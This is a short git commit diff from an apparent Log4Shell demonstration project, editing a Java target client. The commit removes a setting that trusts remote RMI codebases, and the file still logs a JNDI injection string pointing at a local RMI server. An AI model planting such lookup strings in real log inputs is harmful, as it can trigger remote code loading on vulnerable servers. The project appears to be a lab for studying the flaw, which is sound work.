e03e36bc8e86c4ae57b653774f1c413c463941ba
pkostop <pkostop@gmail.com>
2021-12-20 14:06:28 +0200

    2nd commit

--- src/main/java/log4jattack/TargetClient.java
+++ src/main/java/log4jattack/TargetClient.java
@@ -11,7 +11,6 @@ import javax.naming.NamingException;
 
 public class TargetClient {
 	public static void main(String[] args) throws NamingException, RemoteException, InterruptedException {
-		System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");		
 		Logger logger=LogManager.getLogger(TargetClient.class.getName());
 		logger.error("${jndi:rmi://localhost:1097/Object}");
 		System.out.println("Log4j vulnerability is fixed!!!");
